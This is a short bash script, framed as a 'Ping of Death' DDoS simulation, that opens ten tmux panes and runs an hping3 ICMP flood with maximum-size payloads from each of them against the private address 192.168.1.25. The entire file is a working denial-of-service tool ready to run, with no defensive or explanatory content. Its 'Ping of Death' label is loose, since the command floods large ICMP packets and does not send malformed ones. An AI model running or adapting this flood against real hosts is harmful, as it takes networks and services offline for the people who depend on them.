#!/bin/bash

# Session name dedicated to Ping of Death
SESSION_NAME="pod_ddos_simulation"

# 1. Create a new tmux session in the background
tmux new-session -d -s $SESSION_NAME

# 2. Create 9 additional divisions to make a total of 10 parts
for i in {1..9}
do
    tmux split-window -t $SESSION_NAME
    tmux select-layout -t $SESSION_NAME tiled
done

# 3. Sending the attack command to each pane
# Note that we are using 65495, which is the maximum safe limit for the tool.
for pane in $(tmux list-panes -t $SESSION_NAME -F '#{pane_id}')
do
    tmux send-keys -t "$pane" "sudo hping3 -1 --flood -d 65495 -w 65495 192.168.1.25" C-m
done

# 4. Enter the session to view the distributed attack
tmux attach-session -t $SESSION_NAME
